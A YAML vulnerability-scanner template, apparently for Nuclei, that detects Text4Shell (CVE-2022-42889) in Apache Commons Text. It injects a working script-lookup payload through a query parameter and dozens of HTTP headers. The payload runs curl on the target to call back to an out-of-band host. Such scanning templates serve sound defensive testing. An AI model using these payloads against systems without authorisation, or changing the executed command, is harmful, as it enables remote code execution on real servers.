id: CVE-2022-42889

info:
  name: Text4Shell Remote Code Execution
  author: mordavid
  severity: critical
  description: |
    Apache Commons Text 1.5-1.9, CVE-2022-42889 affects Apache Commons Text versions 1.5 through 1.9. It has been patched as of Commons Text version 1.10.
  reference:
    - https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om
    - http://www.openwall.com/lists/oss-security/2022/10/13/4
    - http://www.openwall.com/lists/oss-security/2022/10/18/1
    - https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/
    - https://github.com/silentsignal/burp-text4shell
  remediation: Upgrade to Apache Commons Text component between 1.5.0 to 1.10.0.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-42889
  tags: cve,cve2022,rce,oast,text4shell

requests:
  - raw:
      - |
        GET /?search=%24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.uri.{{interactsh-url}}')%7d  HTTP/1.1
        Host: {{Hostname}}

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Accept-Charset: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Accept-Datetime: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Accept-Language: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Cache-Control: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Cookie: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        DNT: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Forwarded: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Forwarded-For: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Forwarded-For-Ip: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Forwarded-Proto: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        From: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Max-Forwards: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Origin: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Pragma: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Referer: https://%24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        TE: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        True-Client-IP: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Upgrade: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Via: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Warning: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Api-Version: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-ATT-DeviceId: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Correlation-ID: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Csrf-Token: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-CSRFToken: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Do-Not-Track: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Foo: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Foo-Bar: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forwarded: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forwarded-By: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forwarded-For: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forwarded-For-Original: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forwarded-Host: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forwarded-Port: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forwarded-Proto: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forwarded-Protocol: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forwarded-Scheme: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forwarded-Server: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forwarded-Ssl: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forwarder-For: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forward-For: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Forward-Proto: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Frame-Options: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-From: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Geoip-Country: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Http-Destinationurl: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Http-Host-Override: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Http-Method: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-HTTP-Method-Override: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Http-Path-Override: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Https: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Htx-Agent: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Hub-Signature: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-If-Unmodified-Since: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Imbo-Test-Config: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Insight: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Ip: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Ip-Trail: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-ProxyUser-Ip: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Requested-With: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Request-ID: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-UIDH: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-Wap-Profile: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        X-XSRF-TOKEN: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"

      - type: regex
        part: interactsh_request
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output

    extractors:
      - type: kval
        kval:
          - interactsh_ip # Print remote interaction IP in output

      - type: regex
        part: interactsh_request
        group: 2
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output

      - type: regex
        part: interactsh_request
        group: 1
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
